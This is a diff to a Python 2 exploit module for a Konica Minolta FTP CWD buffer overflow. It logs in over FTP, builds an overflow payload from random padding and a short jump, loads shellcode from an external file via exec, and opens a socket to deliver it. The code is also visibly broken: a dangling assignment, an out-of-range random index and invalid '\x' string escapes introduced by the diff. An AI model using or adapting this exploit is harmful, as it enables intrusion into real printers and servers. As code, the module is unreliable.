@@ -67,8 +67,8 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
         self.host[0] = gethostbyname(self.host[0])
       ftp = ftplib.FTP(self.host[0])
     try:
-     ftp.login(self.user[0], self.passwd[0])
-     print "[+]Login successful on %s" % self.host[0]
+      ftp.login(self.user[0], self.passwd[0])
+      print "[+]Login successful on %s" % self.host[0]
     except:
       print "[-]Login unsuccessful on %s" % self.host[0]
       return
@@ -77,14 +77,14 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 1037):
-      payload += "\\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\\xeb\\x06"
+      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+    payload += "\xeb\x06"
     for a in range(0, 2):
-      payload += "\\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
     payload += 
     exec(open("../../../payloads/konica_minolta_cwd.shell", "r").read())
     for a in range(0, 1037):
-      payload += "\\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
